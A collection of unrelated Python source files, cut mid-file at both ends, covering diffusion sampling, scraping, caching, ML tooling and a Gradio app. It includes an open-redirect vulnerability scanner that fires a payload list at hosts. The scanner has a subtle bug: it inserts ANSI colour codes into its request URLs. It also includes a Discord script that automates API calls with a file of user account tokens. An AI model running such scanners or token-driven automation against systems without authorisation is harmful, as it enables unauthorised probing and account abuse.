device='cpu'):\r\n    \"\"\"Constructs an polynomial in log sigma noise schedule.\"\"\"\r\n    ramp = torch.linspace(1, 0, n, device=device) ** rho\r\n    sigmas = torch.exp(ramp * (math.log(sigma_max) - math.log(sigma_min)) + math.log(sigma_min))\r\n    return append_zero(sigmas)\r\n\r\n\r\ndef get_sigmas_vp(n, beta_d=19.9, beta_min=0.1, eps_s=1e-3, device='cpu'):\r\n    \"\"\"Constructs a continuous VP noise schedule.\"\"\"\r\n    t = torch.linspace(1, eps_s, n, device=device)\r\n    sigmas = torch.sqrt(torch.exp(beta_d * t ** 2 / 2 + beta_min * t) - 1)\r\n    return append_zero(sigmas)\r\n\r\n\r\ndef to_d(x, sigma, denoised):\r\n    \"\"\"Converts a denoiser output to a Karras ODE derivative.\"\"\"\r\n    return (x - denoised) / utils.append_dims(sigma, x.ndim)\r\n\r\n\r\ndef get_ancestral_step(sigma_from, sigma_to, eta=1.):\r\n    \"\"\"Calculates the noise level (sigma_down) to step down to and the amount\r\n    of noise to add (sigma_up) when doing an ancestral sampling step.\"\"\"\r\n    if not eta:\r\n        return sigma_to, 0.\r\n    sigma_up = min(sigma_to, eta * (sigma_to ** 2 * (sigma_from ** 2 - sigma_to ** 2) / sigma_from ** 2) ** 0.5)\r\n    # eta = 0\u65f6\uff0csigma_up == 0,\r\n    sigma_down = (sigma_to ** 2 - sigma_up ** 2) ** 0.5\r\n    return sigma_down, sigma_up\r\n\r\n\r\ndef default_noise_sampler(x):\r\n    return lambda sigma, sigma_next: torch.randn_like(x)\r\n\r\n\r\nclass BatchedBrownianTree:\r\n    \"\"\"A wrapper around torchsde.BrownianTree that enables batches of entropy.\"\"\"\r\n\r\n    def __init__(self, x, t0, t1, seed=None, **kwargs):\r\n        t0, t1, self.sign = self.sort(t0, t1)\r\n        w0 = kwargs.get('w0', torch.zeros_like(x))\r\n        if seed is None:\r\n            seed = torch.randint(0, 2 ** 63 - 1, []).item()\r\n        self.batched = True\r\n        try:\r\n            assert len(seed) == x.shape[0]\r\n            w0 = w0[0]\r\n        except TypeError:\r\n            seed = [seed]\r\n            self.batched = False\r\n        self.trees = [torchsde.BrownianTree(t0, w0, t1, entropy=s, **kwargs) for s in seed]\r\n\r\n    @staticmethod\r\n    def sort(a, b):\r\n        return (a, b, 1) if a < b else (b, a, -1)\r\n\r\n    def __call__(self, t0, t1):\r\n        t0, t1, sign = self.sort(t0, t1)\r\n        w = torch.stack([tree(t0, t1) for tree in self.trees]) * (self.sign * sign)\r\n        return w if self.batched else w[0]\r\n\r\n\r\nclass BrownianTreeNoiseSampler:\r\n    \"\"\"A noise sampler backed by a torchsde.BrownianTree.\r\n\r\n    Args:\r\n        x (Tensor): The tensor whose shape, device and dtype to use to generate\r\n            random samples.\r\n        sigma_min (float): The low end of the valid interval.\r\n        sigma_max (float): The high end of the valid interval.\r\n        seed (int or List[int]): The random seed. If a list of seeds is\r\n            supplied instead of a single integer, then the noise sampler will\r\n            use one BrownianTree per batch item, each with its own seed.\r\n        transform (callable): A function that maps sigma to the sampler's\r\n            internal timestep.\r\n    \"\"\"\r\n\r\n    def __init__(self, x, sigma_min, sigma_max, seed=None, transform=lambda x: x):\r\n        self.transform = transform\r\n        t0, t1 = self.transform(torch.as_tensor(sigma_min)), self.transform(torch.as_tensor(sigma_max))\r\n        self.tree = BatchedBrownianTree(x, t0, t1, seed)\r\n\r\n    def __call__(self, sigma, sigma_next):\r\n        t0, t1 = self.transform(torch.as_tensor(sigma)), self.transform(torch.as_tensor(sigma_next))\r\n        return self.tree(t0, t1) / (t1 - t0).abs().sqrt()\r\n\r\n\r\n@torch.no_grad()\r\ndef sample_euler(model, x, sigmas, extra_args=None, callback=None, disable=None, s_churn=0., s_tmin=0., s_tmax=float('inf'), s_noise=1.):\r\n    \"\"\"Implements Algorithm 2 (Euler steps) from Karras et al. (2022).\"\"\"\r\n    extra_args = {} if extra_args is None else extra_args\r\n    # \u68c0\u67e5\u662f\u5426\u6709\u989d\u5916\u53c2\u6570\uff0c\u4e0d\u7528\u7ba1\u4e5f\u4e0d\u8981\u6539\r\n    s_in = x.new_ones([x.shape[0]])\r\n    # \u8d4b\u4e88\u8f93\u5165\u5411\u91cf\u7b49\u4e8e\u6c42\u89e3\u5411\u91cf\u7ef4\u5ea6\uff0c\u4e0d\u7528\u7ba1\u4e5f\u4e0d\u8981\u6539\r\n    for i in trange(len(sigmas) - 1, disable=disable):\r\n        # sigma\u7531\u6b65\u6570\u51b3\u5b9a,\u9ed8\u8ba420\u6b65\u4e0b\uff0clen(signas)-1\u4ee3\u8868\u5bf9\u4e8e0-19\u90fd\u89e3\u7b97\u4e00\u6b21\r\n        gamma = min(s_churn / (len(sigmas) - 1), 2 ** 0.5 - 1) if s_tmin <= sigmas[i] <= s_tmax else 0",
    "import time\n\n\ndef filter_by_author(quotes, author):\n    \"\"\"\n    Filters quotes by author\n    :param quotes: The list of quotes to be filtered\n    :param author: The inputted author to filter the quotes by\n    :return:\n        - quotes: A list of quotes by the inputted author\n    \"\"\"\n    return [quote for quote in quotes if quote[1].lower() == author.lower()] if author else quotes\n\n\ndef filter_to_daily_quote(quotes):\n    \"\"\"\n    Filters quotes to get a quote based on the current day\n    :param quotes: The list of quotes to be filtered\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    current_day = int(time.time()) / 86400\n    return [quotes[int(current_day) % len(quotes)]]\n\ndef filter_by_excluded_ids(quotes, exclude_indexes):\n    \"\"\"\n    Filters quotes by excluded indexes\n    :param quotes: The list of quotes to be filtered\n    :param exclude_indexes: The original string of numbers to be excluded\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    exclude_indexes = [int(index) for index in exclude_indexes.split(\",\") if index.strip()]\n    return [quote for quote in quotes if quote[2] not in exclude_indexes]\n\n\ndef get_specific_quote(quotes, specific_quote):\n    \"\"\"\n    Filters quotes to get a specific quote\n    :param quotes: The list of quotes to be filtered\n    :param specific_quote: The specific quote to be filtered\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    return [quote for quote in quotes if quote[0][:len(specific_quote)].lower() == specific_quote.lower()]\n\n\ndef get_quote_by_index(quotes, specific_quote_index):\n    \"\"\"\n    Filters quotes to get a specific quote by index\n    :param quotes: The list of quotes to be filtered\n    :param specific_quote_index: The index of the specific quote to be filtered\n    :return:\n        - quotes: The filtered list of quotes with a single quote inside\n    \"\"\"\n    return [quote for quote in quotes if quote[2] == specific_quote_index]\n",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.maximize_window()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\n\r\nusername.send_keys(\"xxxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\nname_search = \"xxxxxxxxxxxx\" # Write Username Of Account\r\n\r\nurl = f\"https://www.instagram.com/{name_search}/\"\r\n\r\ntime.sleep(3)\r\ndriver.get(url)\r\ntime.sleep(10)\r\n\r\n\r\n#scroll\r\nscrolldown=driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\nmatch=False\r\nposts = []\r\nwhile(match==False):\r\n    last_count = scrolldown\r\n    time.sleep(3)\r\n    scrolldown = driver.execute_script(\"window.scrollTo(0, document.body.scrollHeight);var scrolldown=document.body.scrollHeight;return scrolldown;\")\r\n\r\n    links = driver.find_elements(By.TAG_NAME, \"a\")\r\n    for link in links:\r\n        try:\r\n            post = link.get_attribute('href')\r\n        except:\r\n            continue\r\n        if post not in posts:\r\n            if '/p/' in post:\r\n                posts.append(post)\r\n\r\n\r\n    if last_count==scrolldown:\r\n        match=True\r\n\r\n\r\nimgs_link = []\r\nnumber = 1\r\n\r\n#get videos and images\r\ndownload_url = ''\r\nfor post in posts:\r\n    driver.get(post)\r\n    shortcode = driver.current_url.split('/')[-2]\r\n    num = 1\r\n    time.sleep(3)\r\n\r\n    main_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\n    while True:\r\n        imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n        for img in imgs:\r\n            link = img.get_attribute('src')\r\n            if link not in imgs_link:\r\n                urllib.request.urlretrieve(link, f'img_{number}{shortcode}{num}.jpg')\r\n                num += 1\r\n                imgs_link.append(link)\r\n\r\n                time.sleep(5)\r\n\r\n        try:\r\n            driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n            time.sleep(3)\r\n        except:\r\n            number += 1\r\n            break\r\n",
    "from functools import wraps\nfrom typing import Optional\n\nfrom qdrant_client import QdrantClient\n\nclient = QdrantClient(\":memory:\")\nout_store = {}\n\n\ndef semantic_cache(similarity_threshold: Optional[float] = None):\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            func_name = func.__name__\n            arg_desc = \", \".join([f\"arg{i}: {str(arg)}\" for i, arg in enumerate(args)])\n            kwarg_desc = \", \".join([f\"{k}={str(v)}\" for k, v in kwargs.items()])\n\n            params_str = f\"Function: {func_name}\\nArguments: {arg_desc}\\nKeyword Arguments: {kwarg_desc}\"\n\n            fn_cache_name = str(hash(func.__code__))\n            if client.collection_exists(fn_cache_name):\n                embeddings = client.query(\n                    collection_name=fn_cache_name,\n                    query_text=params_str,\n                    limit=1,\n                )\n                if embeddings:\n                    embedding = embeddings[0]\n                    key = (\n                        embedding.metadata[\"args\"],\n                        frozenset(embedding.metadata[\"kwargs\"].items()),\n                    )\n                    score = embedding.score\n                    if score >= (similarity_threshold or 0.95):\n                        if key in out_store:\n                            return out_store[key]\n\n            client.add(\n                documents=[params_str],\n                collection_name=fn_cache_name,\n                metadata=[{\"args\": args, \"kwargs\": kwargs}],\n                ids=[str(hash(params_str))],\n            )\n\n            out = func(*args, **kwargs)\n            key = (args, frozenset(kwargs.items()))\n            out_store[key] = out\n            return out\n\n        return wrapper\n\n    return decorator\n",
    "\"\"\" \nRetriever for experiment assets.\n\"\"\"\nfrom importlib.machinery import SourceFileLoader\nimport inspect\nimport json\nimport os\nimport ast\n\nimport numpy as np\nimport modlee\nfrom modlee import logging\n\nimport mlflow\nfrom mlflow.client import MlflowClient\n\n\ndef run_path_exists(run_path):\n    \"\"\"\n    Chek if a run path exists.\n\n    :param run_path: The run path to check.\n    :return: Whether the path exists or not.\n    \"\"\"\n    if not os.path.exists(run_path):\n        logging.warning(f\"Run directory {run_path} does not exist\")\n        return False\n    return True\n\n\ndef get_runs(run_path, experiment_id=None, run_id=None, **kwargs):\n    \"\"\"\n    Get the runs in a given run path.\n\n    :param run_path: The path to search.\n    :param experiment_id: The experiment ID to retrieve, defaults to None and retrieves all experiments.\n    :param run_id: The run ID to retrieve, defaults to None to retrieves all runs.\n    :return: A list of runs.\n    \"\"\"\n    if not run_path_exists(run_path):\n        return []\n\n    modlee.set_run_path(run_path)\n\n    client = MlflowClient()\n    experiments = client.search_experiments()\n\n    if len(experiments) == 0:\n        logging.warning(f\"No experiments found in {run_path}\")\n        return []\n    runs = []\n    if experiment_id is not None:\n        experiments = [experiments[experiment_id]]\n    filter_string = \"\"\n    if run_id is not None:\n        filter_string = f\"run_id='{run_id}'\"\n    for experiment in experiments:\n        _exp_runs = client.search_runs(\n            experiment.experiment_id, filter_string, **kwargs\n        )\n        runs = [*runs, *_exp_runs]\n\n    return runs\n\n\ndef get_model(run_path):\n    \"\"\"\n    Get the model at a run path.\n\n    :param run_path: The run path.\n    :return: The model as a ModleeModel object.\n    \"\"\"\n    if not run_path_exists(run_path):\n        return None\n    model = SourceFileLoader(\n        \"modlee_mod\", f\"{run_path}/artifacts/model.py\"\n    ).load_module()\n\n    # retrieve the variables for the object signature\n    model_kwargs = dict(inspect.signature(model.ModleeModel).parameters)\n    model_kwargs.pop(\"args\"), model_kwargs.pop(\"kwargs\")\n    cached_vars = get_cached_vars(run_path)\n    keys_to_pop = []\n    for model_key, model_val in model_kwargs.items():\n        cached_val = cached_vars.get(model_key, None)\n        if cached_val:\n            model_kwargs.update({model_key: cached_val})\n        elif model_val.default != inspect._empty:\n            model_kwargs.update({model_key: model_val.default})\n        else:\n            keys_to_pop.append(model_key)\n    for key_to_pop in keys_to_pop:\n        model_kwargs.pop(key_to_pop)\n\n    # recreate the model\n    return model.ModleeModel(**model_kwargs)\n\n\ndef get_cached_vars(run_path):\n    \"\"\"\n    Get the cached variables required to rebuild a model from a run path.\n\n    :param run_path: The run path.\n    :return: A dictionary of the cached variables.\n    \"\"\"\n    if not run_path_exists(run_path):\n        return {}\n    with open(f\"{run_path}/artifacts/cached_vars\", \"r\") as vars_file:\n        return json.loads(vars_file.read())\n\n\ndef get_data_snapshot(run_path):\n    \"\"\"\n    Get the saved data snapshot from a run path.\n\n    :param run_path: The run path.\n    :return: The data snapshot as a numpy array.\n    \"\"\"\n    if not run_path_exists(run_path):\n        return None\n\n    # data_snapshot_path = f\"{run_path}/artifacts/data_snapshot.npy\"\n\n    # Adding new snapshot name to the path following batched processing changes\n    data_snapshot_path = f\"{run_path}/artifacts/snapshot_0.npy\"\n\n    if not os.path.exists(data_snapshot_path):\n        return None\n    return np.load(data_snapshot_path)\n",
    "import os\nimport sys\nimport openai\nfrom pyparsing import QuotedString\nimport platform\n\ndef get_api_key_path():\n    if platform.system() == 'Windows':\n        api_key_path = os.path.join(os.getenv('APPDATA'), '.apikey')\n    elif platform.system() == 'Darwin':\n        api_key_path = os.path.expanduser('~/.apikey')\n    else:\n        api_key_path = os.path.expanduser('~/.apikey')\n    return api_key_path\n\ndef load_api_key(api_key_path):\n    with open(api_key_path, 'r') as file:\n        api_key = file.read().strip()\n    return api_key\n\ndef save_api_key(api_key, api_key_path):\n    with open(api_key_path, 'w') as file:\n        file.write(api_key)\n\ndef process_lpy_file(file_path):\n    with open(file_path, 'r') as file:\n        content = file.read()\n        \n    print(\"reached\")\n\n    csm_snippets = QuotedString('`', multiline=True).setParseAction(lambda t: t[0][1:-1]).searchString(content)\n\n    for snippet in csm_snippets:\n        if '[csm]' in snippet:\n            code_snippet = snippet.split('[csm]')[1].strip()\n            print(f\"Processing code snippet: {code_snippet}\")\n            converted_code = convert_with_chatgpt(code_snippet)\n            content = content.replace(f'`{snippet}`', converted_code)\n\n    py_file_path = file_path.replace('.lpy', '.py')\n    \n    if os.path.exists(py_file_path):\n        os.remove(py_file_path)\n    \n    with open(py_file_path, 'w') as file:\n        file.write(content)\n\n    while True:\n        try:\n            compile(content, py_file_path, 'exec')\n            print(f\"Successfully compiled: {py_file_path}\")\n            break\n        except SyntaxError as e:\n            print(f\"Compilation error: {str(e)}\")\n            corrected_code = correct_with_chatgpt(content, str(e))\n            content = corrected_code\n            with open(py_file_path, 'w') as file:\n                file.write(content)\n\ndef convert_with_chatgpt(code_snippet):\n    prompt = f\"Please convert the following description / pseudo-code into valid Python:\\n\\n```{code_snippet}```\\n\\nProvide only the converted Python code in your response, without any explanations. Do not include the original description / pseudo-code in your response. You are being queried by an API to generate code so please make do and write code that compiles and do not respond with words or with markdown.\"\n\n    response = openai.chat.completions.create(\n        model=\"gpt-4\",\n        messages=[{\"role\": \"user\", \"content\": prompt}],\n        temperature=0,\n    )\n    print(response.choices[0].message)\n\n    converted_code = response.choices[0].message.content.strip()\n    return converted_code\n\ndef correct_with_chatgpt(code, error_message):\n    prompt = f\"The following Python code has a compilation error:\\n\\n```{code}```\\n\\nError message: {error_message}\\n\\nPlease correct the code and provide only the corrected Python code in your response, without any explanations. You are being queried by an API to generate code so please make do and write code that compiles and do not respond with words or with markdown.\"\n\n    response = openai.chat.completions.create(\n        model=\"gpt-4\",\n        messages=[{\"role\": \"user\", \"content\": prompt}],\n        temperature=0,\n    )\n\n    corrected_code = response.choices[0].message.content.strip()\n    return corrected_code\n\nif __name__ == '__main__':\n    if len(sys.argv) < 2:\n        print(\"Please provide the path to the .lpy file as a command-line argument.\")\n        sys.exit(1)\n\n    lpy_file_path = sys.argv[1]\n\n    api_key_path = get_api_key_path()\n\n    if '-a' in sys.argv:\n        api_key_index = sys.argv.index('-a') + 1\n        if api_key_index < len(sys.argv):\n            api_key = sys.argv[api_key_index]\n            save_api_key(api_key, api_key_path)\n        else:\n            print(\"Please provide an API key after the -a flag.\")\n            sys.exit(1)\n    else:\n        try:\n            api_key = load_api_key(api_key_path)\n        except FileNotFoundError:\n            print(f\"API key file not found at {api_key_path}. Please provide an API key using the -a flag.\")\n            sys.exit(1)\n\n    openai.api_key = api_key\n\n    process_lpy_file(lpy_file_path)",
    "import time\r\nimport requests\r\n\r\nfrom colorama import Fore, init\r\nfrom modules.utils import Utils\r\n\r\ninit()\r\n\r\nwith open(\"tokens.txt\", \"r\") as f:\r\n    tokens = f.readlines()\r\n    for i in tokens:\r\n        token = i.rstrip()\r\n        items_found = []\r\n        \r\n        headers = Utils.get_headers(token)\r\n        \r\n        while len(items_found) != 9:\r\n            r = requests.post(\"https://discord.com/api/v9/users/@me/lootboxes/open\", headers=headers).json()\r\n            if 'retry_after' in r:\r\n                print('[' + Fore.RED + '-' + Fore.RESET + ']' + 'ratelimited for ' + str(r['retry_after']) + 'second')\r\n                time.sleep(r['retry_after'])\r\n            else:\r\n                items = r['opened_item']\r\n                items_name = Utils.get_name_items(items)\r\n                if items_name in items_found:\r\n                    print('[' + Fore.BLUE + '?' + Fore.RESET + ']' + 'found:' + items_name)\r\n                else:\r\n                    print('[' + Fore.GREEN + '+' + Fore.RESET + ']' + 'found a new object:' + items_name)\r\n                    items_found.append(items_name)\r\n        \r\n        r = requests.post(\"https://discord.com/api/v9/users/@me/lootboxes/redeem-prize\", headers=headers)\r\n        if r.status_code == 200:\r\n            print('[' + Fore.GREEN + '+' + Fore.RESET + ']' + 'automatically redeemed clown decoration')\r\n        else:\r\n            print('[' + Fore.RED + '-' + Fore.RESET + ']' + 'failed to automatically redeeme clown decoration')",
    "import requests\nimport sys\nimport time\nimport os\nimport argparse\n\n# Color codes\nYELLOW = '\\033[93m'\nGREEN = '\\033[92m'\nRED = '\\033[91m'\nENDC = '\\033[0m'\n\ndef clear_screen():\n    os.system('clear')\n\ndef print_banner():\n    clear_screen()\n    print(\"#################################################\")\n    print(\"# Open redirect Scanner for ScriptKiddies like me :)  #\")\n    print(\"#  by archtrmntor (archtrmntor@proton.me)       #\")\n    print(\"#  twitter.com/Archtrmntor                      #\")\n    print(\"#  Linkedin Username :- Archtrmntor             #\")\n    print(\"#################################################\")\n    print(\"\")\n    print(\"Usage: ./redirect.py [options]\")\n    print(\"\")\n    print(\"         ./redirect.py -u http://example.com -p payloads.txt -o output.txt\")\n    print(\"\")\n    print(\"Color coding:\")\n    print(\"    - Testing message: \" + YELLOW + \"Yellow\" + ENDC)\n    print(\"    - Redirected status code 301: \" + GREEN + \"Green\" + ENDC)\n    print(\"    - Other error status codes: \" + RED + \"Red\" + ENDC)\n    print(\"\")\n    print(\"For extracting the final 301 redirect successful attempt, use the following command:\")\n    print(\"cat output_filename.txt | grep -e '+ 301' -e 'Final destination'\")\n\ndef parse_arguments():\n    parser = argparse.ArgumentParser(description=\"Open Redirect Scanner\")\n    parser.add_argument(\"-f\", \"--file\", help=\"File containing subdomains\")\n    parser.add_argument(\"-u\", \"--url\", help=\"URL to scan for open redirect vulnerability\")\n    parser.add_argument(\"-p\", \"--payloads\", help=\"File containing list of payloads\", required=True)\n    parser.add_argument(\"-o\", \"--output\", help=\"Output file to save results\")\n    return parser.parse_args()\n\ndef load_payloads(payloads_file):\n    with open(payloads_file) as f:\n        return f.readlines()\n\ndef colorize_response(response):\n    status_code = response.status_code\n    if status_code == 301:\n        return GREEN + str(status_code) + ENDC\n    elif status_code >= 400 and status_code < 500:\n        return RED + str(status_code) + ENDC\n    else:\n        return str(status_code)\n\ndef save_output(output_file, message):\n    with open(output_file, \"a\") as f:\n        f.write(message + \"\\n\")\n\ndef scan_redirects(subdomains_file, payloads, output_file):\n    with open(subdomains_file) as f:\n        print(\"\")\n        print(\"Searching for open redirect vulnerabilities...\")\n        print(\"\")\n        time.sleep(2)\n        for line in f:\n            line = line.strip()\n            for payload in payloads:\n                try:\n                    url = 'http://' + line + RED + payload.strip() + ENDC\n                    print(YELLOW + \"Testing: \" + url + ENDC)\n                    response = requests.get(url, verify=True)\n                    if response.history:\n                        message = \"Request was redirected\\n\"\n                        for resp in response.history:\n                            message += \"| \" + colorize_response(resp) + \" \" + resp.url + \"\\n\"\n                        message += \"Final destination:\\n+ \" + colorize_response(response) + \" \" + response.url\n                        print(message)\n                    else:\n                        print(\"Request was not redirected\")\n                    if output_file:\n                        save_output(output_file, url)\n                        save_output(output_file, message)\n                except Exception as e:\n                    print(\"Error occurred:\", str(e))\n            print(\"\\n\" + \"-\"*50 + \"\\n\")\n\ndef scan_redirects_single_url(url, payloads, output_file):\n    print(\"\")\n    print(\"Searching for open redirect vulnerabilities...\")\n    print(\"\")\n    time.sleep(2)\n    for payload in payloads:\n        try:\n            url_with_payload = url + RED + payload.strip() + ENDC\n            print(YELLOW + \"Testing: \" + url_with_payload + ENDC)\n            response = requests.get(url_with_payload, verify=True)\n            if response.history:\n                message = \"Request was redirected\\n\"\n                for resp in response.history:\n                    message += \"| \" + colorize_response(resp) + \" \" + resp.url + \"\\n\"\n                message += \"Final destination:\\n+ \" + colorize_response(response) + \" \" + response.url\n                print(message)\n            else:\n                print(\"Request was not redirected\")\n            if output_file:\n                save_output(output_file, url_with_payload)\n                save_output(output_file, message)\n        except Exception as e:\n            print(\"Error occurred:\", str(e))\n        print(\"\\n\" + \"-\"*50 + \"\\n\")\n\ndef main():\n    print_banner()\n    args = parse_arguments()\n    payloads_file = args.payloads\n    payloads = load_payloads(payloads_file)\n    output_file = args.output\n    if args.file:\n        subdomains_file = args.file\n        scan_redirects(subdomains_file, payloads, output_file)\n    elif args.url:\n        url = args.url\n        scan_redirects_single_url(url, payloads, output_file)\n    else:\n        print(\"Please provide either a file",
    "import cv2\r\nimport gradio as gr\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\n# input_video = 'car.mp4'\r\n\r\n# video Inference\r\n\r\n\r\ndef vid_inf(vid_path):\r\n    # Create a VideoCapture object\r\n    cap = cv2.VideoCapture(vid_path)\r\n\r\n    # get the video frames' width and height for proper saving of videos\r\n    frame_width = int(cap.get(3))\r\n    frame_height = int(cap.get(4))\r\n    fps = int(cap.get(cv2.CAP_PROP_FPS))\r\n    frame_size = (frame_width, frame_height)\r\n    fourcc = cv2.VideoWriter_fourcc(*'mp4v')\r\n    output_video = \"output_recorded.mp4\"\r\n\r\n    # create the `VideoWriter()` object\r\n    out = cv2.VideoWriter(output_video, fourcc, fps, frame_size)\r\n\r\n    # Create Background Subtractor MOG2 object\r\n    backSub = cv2.createBackgroundSubtractorMOG2()\r\n\r\n    # Check if camera opened successfully\r\n    if not cap.isOpened():\r\n        print(\"Error opening video file\")\r\n    count = 0\r\n    # Read until video is completed\r\n    while cap.isOpened():\r\n        # Capture frame-by-frame\r\n        ret, frame = cap.read()\r\n        # print(frame.shape)\r\n        if ret:\r\n            # Apply background subtraction\r\n            fg_mask = backSub.apply(frame)\r\n            # print(fg_mask.shape)\r\n            # cv2.imshow('Frame_bg', fg_mask)\r\n\r\n            # apply global threshol to remove shadows\r\n            retval, mask_thresh = cv2.threshold(\r\n                fg_mask, 180, 255, cv2.THRESH_BINARY)\r\n            # cv2.imshow('frame_thresh', mask_thresh)\r\n\r\n            # set the kernal\r\n            kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))\r\n            # Apply erosion\r\n            mask_eroded = cv2.morphologyEx(mask_thresh, cv2.MORPH_OPEN, kernel)\r\n            # cv2.imshow('frame_erode', mask_eroded)\r\n\r\n            # Find contours\r\n            contours, hierarchy = cv2.findContours(\r\n                mask_eroded, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n            # print(contours)\r\n\r\n            min_contour_area = 2000  # Define your minimum area threshold\r\n            large_contours = [\r\n                cnt for cnt in contours if cv2.contourArea(cnt) > min_contour_area]\r\n            # frame_ct = cv2.drawContours(frame, large_contours, -1, (0, 255, 0), 2)\r\n            frame_out = frame.copy()\r\n            for cnt in large_contours:\r\n                # print(cnt.shape)\r\n                x, y, w, h = cv2.boundingRect(cnt)\r\n                frame_out = cv2.rectangle(\r\n                    frame, (x, y), (x+w, y+h), (0, 0, 200), 3)\r\n            frame_out_display = cv2.cvtColor(frame_out, cv2.COLOR_BGR2RGB)\r\n            vid = out.write(frame_out)\r\n\r\n            # Display the resulting frame\r\n            # cv2.imshow('Frame_final', frame_out)\r\n\r\n            # update the count every frame and display every 12th frame\r\n            if not count % 12:\r\n                yield frame_out_display, None\r\n            count += 1\r\n\r\n            # Press Q on keyboard to exit\r\n            if cv2.waitKey(25) & 0xFF == ord('q'):\r\n                break\r\n        else:\r\n            break\r\n\r\n    # When everything done, release the video capture and writer object\r\n    cap.release()\r\n    out.release()\r\n    # Closes all the frames\r\n    cv2.destroyAllWindows()\r\n    yield None, output_video\r\n\r\n# vid_inf(input_video)\r\n\r\n\r\n# gradio interface\r\ninput_video = gr.Video(label=\"Input Video\")\r\noutput_frames = gr.Image(label=\"Output Frames\")\r\noutput_video_file = gr.Video(label=\"Output video\")\r\n# sample_video=r'sample/car.mp4'\r\n\r\napp = gr.Interface(\r\n    fn=vid_inf,\r\n    inputs=[input_video],\r\n    outputs=[output_frames, output_video_file],\r\n    title=f\"MotionScope\",\r\n    description=f'A gradio app for dynamic video analysis tool that leverages advanced background subtraction and contour detection techniques to identify and track moving objects in real-time.',\r\n    allow_flagging=\"never\",\r\n    examples=[[\"sample/car.mp4\"]],\r\n)\r\napp.queue().launch()",
    "import json\nfrom vllm import LLM, SamplingParams\nfrom openai import OpenAI\nimport requests\nfrom inference_util import *\nfrom prompts import DEFAULT_REASONING_PROMPT\n\nSYSTEM_MESSAGES = {\n    \"default\": \"You are a helpful assistant.\",\n    \"svg_expert\": \"You are a helpful assistant specially trained in understanding, interpreting, and responding to questions about SVG (Scalable Vector Graphics) code.\"\n}\nDEFAULT_GENERATION_CONFIGS = {\n    \"temperature\": 0.0,\n    \"max_tokens\": 8192,\n    \"top_p\": 1.0,\n}\ndef call_chat_api(client, hosted_model_id, messages, generation_configs = DEFAULT_GENERATION_CONFIGS):\n    query_obj = {\n        \"model\": hosted_model_id,\n        \"messages\": messages,\n        **generation_configs\n    }\n    chat_response = client.chat.completions.create(**query_obj)\n    return chat_response\n\ndef setup_client(\n        openai_api_key = \"EMPTY\", \n        openai_api_base = \"http://localhost:8000/v1\"\n    ):\n    client = OpenAI(\n        api_key=openai_api_key,\n        base_url=openai_api_base,\n    )\n    return client\n\ndef get_perception_from_pvd_responses(responses):\n    perception_objs = {}\n    for key, item in responses.items():\n        obj = json.loads(item['response'])\n        if not isinstance(obj, list):\n            obj = [obj]\n        perception_objs[f\"object_{len(perception_objs)}\"] = obj\n    return perception_objs\n\nimport argparse\nif __name__ == \"__main__\":\n    # === set up input ===\n    \n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--img_path\", type=str, default=\"demo_examples/image_inputs/lines_segments.png\")\n    parser.add_argument(\"--question\", type=str, default=\"What is the total length of the lines?\")\n    parser.add_argument(\"--output_root\", type=str, default=\"demo_examples/perception_output\")\n    args = parser.parse_args()\n\n    svg_conversion_method = \"raw_svg_individual_paths_w_rec_check\"\n    resize_image_before_conversion = False\n\n    # === set up model client ===\n    openai_api_key = \"EMPTY\"\n    openai_api_base = \"http://localhost:8000/v1\"\n\n    print(f\"try automatically find the hosted model id...\")\n    model_list_data = requests.get(f\"{openai_api_base}/models\").json()\n    model_id = model_list_data[\"data\"][0][\"id\"]\n    print(f\"Using model: {model_id}\")\n\n    client = setup_client(openai_api_base=openai_api_base, openai_api_key=openai_api_key)\n\n    generation_configs = DEFAULT_GENERATION_CONFIGS\n    print(\"generation_configs:\", generation_configs)\n\n    model_version = model_id.split(\"/\")[-1]\n    img_2_svg_configs=CONFIGS[\"default\"]\n\n    img_path = args.img_path\n    if \"geoclidean\" in img_path or \"nlvr\" in img_path:\n        diff_threshold = 5e-6\n    else:\n        diff_threshold = 5e-4\n\n    img_base_name = os.path.basename(img_path)\n    \n    output_dir = f\"{args.output_root}/{model_version}/{img_base_name}\"\n\n    output_perception_dir = f\"{output_dir}/output_perception\"\n    svg_output_dir=f\"{output_dir}/svg\"\n    \n    if resize_image_before_conversion:\n        tmp_img_path = 